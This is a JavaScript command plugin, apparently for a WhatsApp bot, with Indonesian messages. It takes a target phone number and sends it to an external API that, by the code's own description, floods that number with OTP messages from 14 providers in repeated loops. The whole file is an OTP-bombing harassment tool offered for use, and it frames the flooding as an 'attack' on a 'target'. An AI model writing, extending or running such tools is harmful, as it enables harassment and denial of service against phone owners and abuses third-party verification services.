import fetch from 'node-fetch';

let handler = async (m, { conn, text, usedPrefix, command }) => {
    if (!text) {
        return m.reply(`💣 *SPAM MASSAL OTP (14 GATEWAYS)*\n\nKirim spam OTP massal ke nomor target!\nContoh:\n${usedPrefix + command} 081234567890`);
    }

    try {
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        m.reply("⏳ Meluncurkan serangan spam OTP 42x request... Mohon tunggu.");

        let nomor = text.replace(/\D/g, '').trim();
        let apiKey = global.apikey?.jereapi;
        let apiUrl = `${global.web}/api/tools/spamotp?apikey=${apiKey}`;

        let res = await fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ nomor })
        });

        let json = await res.json();
        if (!json.status) throw new Error(json.error || json.message || "Gagal meluncurkan spam OTP.");

        let data = json.result || json.data || {};
        let caption = `💣 *SPAM OTP BERHASIL DIKIRIM*\n\n`;
        caption += `📞 *Target:* ${nomor}\n`;
        caption += `🚀 *Status:* Sukses diluncurkan ke 14 provider OTP (3x loop)\n`;
        if (data.total_sent) caption += `📊 *Total Terkirim:* ${data.total_sent}\n`;
        caption += `\n✅ *Request by:* ${m.pushName || 'User'}`;

        await m.reply(caption);
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (e) {
        console.error(e);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        m.reply(`❌ *Spam OTP Gagal*\nError: ${e.message}`);
    }
};

handler.help = ['spamotp <nomor>', 'bomotp <nomor>'];
handler.tags = ['tools'];
handler.command = /^(spamotp|bomotp|otpbot)$/i;
handler.owner = true;

handler.limit = 1;
export default handler;
